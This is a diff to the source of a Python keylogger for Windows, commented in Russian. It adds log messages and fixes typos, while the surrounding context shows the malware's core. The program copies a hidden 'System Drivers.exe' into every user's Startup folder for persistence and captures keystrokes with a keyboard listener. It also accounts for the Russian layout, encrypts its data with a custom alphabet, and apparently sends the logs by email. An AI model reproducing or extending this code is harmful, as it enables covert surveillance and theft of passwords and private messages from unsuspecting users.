@@ -249,13 +249,12 @@ def work_log(message):
 		mkdir('C:\\Logs')
 		SetFileAttributes('C:\\Logs', FILE_ATTRIBUTE_HIDDEN)
 	log_work = open('C:\\Logs\\Work.txt', 'a', encoding = 'utf-8')
-	log_work.writelines(strftime('%H : %M; %d %b') + ':\n')
-	log_work.writelines(message + '\n')
+	log_work.writelines(strftime('%H : %M; %d %b') + ' : ' + message + '\n')
 	log_work.close()
 #==========(2) Для записи в лог файл конец ==========
 #==========(1) Запись в файлы часть 1 конец ==========
 
-crytical_log("Block: filling in backup directories")
+work_log("Block: filling in backup directories")
 #========== Заполнение бэкап папки поумолчанию начало ==========
 #Создание бэкап файлов для файл с насроками электронной почты и файла общих настроек
 if not isdir("C:\\ProgramData\\Backups Drivers"): 
@@ -280,6 +279,7 @@ if not isfile("C:\\ProgramData\\Backups Drivers\\data.dat"):
 			pass
 #========== Заполнение бэкап папки поумолчанию конец ==========
 
+work_log("Block: User Definition")
 #========== Определение пользователей начало ==========
 #Получем всех папки и файлы директории с пользователями
 all_users = listdir('C:\\Users')
@@ -291,6 +291,7 @@ remove_others_users = lambda user: all_users.remove(user) if user in all_users e
 for user in others_users: remove_others_users(user)
 #========== Определение пользователей конец ==========
 
+work_log("Block: Add to startup")
 #========== Добаввление в автозагрузку начало ==========
 #Функция добавления в автозагрузку кейлогера всем уникальным пользователм, если есть доступ и скрытие его
 add_auto_for_users = lambda user: copy('System Drivers.exe', 'C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup') and SetFileAttributes('C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\System Drivers.exe', FILE_ATTRIBUTE_HIDDEN) if (access('C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup', W_OK)) and ('System Drivers.exe' not in listdir('C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')) else print('')
@@ -298,6 +299,7 @@ add_auto_for_users = lambda user: copy('System Drivers.exe', 'C:\\Users\\' + use
 for user in all_users: add_auto_for_users(user)
 #========== Добаввление в автозагрузку конец ==========
 
+work_log("Block: Reading settings file")
 #========== Чтение файла с настройками начало ==========	
 SettingsDat = open("C:\\ProgramData\\Backups Drivers\\Settings.dat", "rb")
 DataSettings = load(SettingsDat)
@@ -312,6 +314,7 @@ folder_for_D = DataSettings[2]
 main_key = DataSettings[3]
 #========== Чтение файла с настройками конец ==========
 
+work_log("Block: For encryption start part 2")
 #========== Для шифрования начало часть 2 начало ==========
 #Дополнительный(закрытый) ключ, который создается из открытого
 dop_key = 0
@@ -321,6 +324,7 @@ key = main_key + dop_key
 alphabet = sorted('4ыhПЩm%ЗXd)мsЪ?UEюДОКЖЭo<етй;n|1нэYИuxСяп3РХ"6и►скЮТЦ+9гFцr$#&ЕЛvJyрkфЁшл-fjG5wъШSЙМgA@QуaZва7z2RГёУхФЯT^0щcplь\/iV.жW=чБдKбe№:ЬLbВOНDBCt8>_!*оЧqMзIHЫ (,PNА')
 #========== Для шифрования начало часть 2 конец ==========
 
+work_log("Block: Language definition")
 #========== Определение языка начало ==========
 #Язык на момент запуска программы(если 00000409 - английский, 00000419 - русский)
 launge = GetKeyboardLayoutName()
@@ -330,7 +334,8 @@ ru_bin, caps_bin, shift_bin, alt_bin, cmd_bin = False, False, False, False, Fals
 if launge == '00000419': ru_bin = True
 #========== Определение языка конец ==========
 
-#========== Определение клавищ начало ==========
+work_log("Block: Key Definition")
+#========== Определение клавиш начало ==========
 #Список активных клавиш
 list_key = GetKeyboardState()
 #Если капс активен, то True
@@ -343,8 +348,9 @@ list_shift = ['Key.shift', 'Key.shift_r']
 list_ctrl = ['Key.ctrl_l', 'Key.ctrl_r']
 #Другие клавишы для смены языка
 list_others = ['Key.cmd', 'Key.space']
-#========== Определение клавищ конец ==========
+#========== Определение клавиш конец ==========
 
+work_log("Block: Date and Time Definition")
 #========== Определение даты и времени начало ==========
 #Дата и время при запуске программы
 time_date_before = strftime('%H : %M; %d %b')
@@ -358,6 +364,7 @@ year_curent = strftime('%Y')
 date_control = ''
 #========== Определение даты и времени конец ==========
 
+work_log("Block: Determining the remaining settings")
 #========== Определение оставшихся настроек начало ==========
 #Диск создания папки и файлов в ней по умолчанию
 disk_key = 'C:\\'
@@ -367,6 +374,7 @@ comp_name = environ['COMPUTERNAME']
 user_name = getlogin()
 #========== Определение оставшихся настроек конец ==========
 
+work_log("Block: Initialization of the main directory and")
 #========== Инициализация главной директории и закачка файла с  данными для электронной почты(по возможности) начало ==========
 #Запишем в файл время и дату, образованное при запуске программы
 #Исключение вызывается, когда папка не найдена или допуск на запись на диск С == False
@@ -431,6 +439,7 @@ except:
 	write_time_date_file(time_date_before, time_for_name, disk_key, "   - - - - - - - - - - - Инициализация - " + user_name + ' - - -\n', 1)
 #========== Инициализация главной директории и закачка файла с  данными для электронной почты(по возможности) конец ==========
 
+work_log("Block: Dictionaries for the application")
 #========== Словари для работы приложения начало ==========
 #Словарь, используйщийся если зажат шифт, то записывает в файл верхний элемент клавиату какой-либо цифры русской раскладки
 dict_ru = {'1' : '!', '2' : '"', '3' : '№',
@@ -564,6 +573,7 @@ def on_release(key):
 #==========(2) Обработчик отжатия конец ==========
 #==========(1) Обработчики нажатия/отжатия конец ==========
 
+work_log("Block: Creating a Handler Class")
 #========== Создание класса обработчика начало ==========
 try:          
     a = keyboard.Listener(on_press = on_press, on_release = on_release)
@@ -576,6 +586,7 @@ except Exception as err:
 write_time_date_file(time_date_before, time_for_name, disk_key, "   - - - - - - - - - - - Запущено - - - - - - - - - -   \n", 0)
 send_control_and_zapis()
 
+work_log("Block: Secondary Process Removal")
 #========== Удаление вторичного процесса начало ==========
 #Функция поиска второго процесса, создаваемого кейлогером и его завершение
 def find_process_pid(process_name):
@@ -590,6 +601,7 @@ def find_process_pid(process_name):
 find_process_pid('System Drivers.exe')
 #========== Удаление вторичного процесса конец ==========
 
+work_log("Block: Starting the end program cycle")
 #========== Запуск бксконечного цикла программы считывания нажатия клавиш начало ==========
 while 1:
     try:
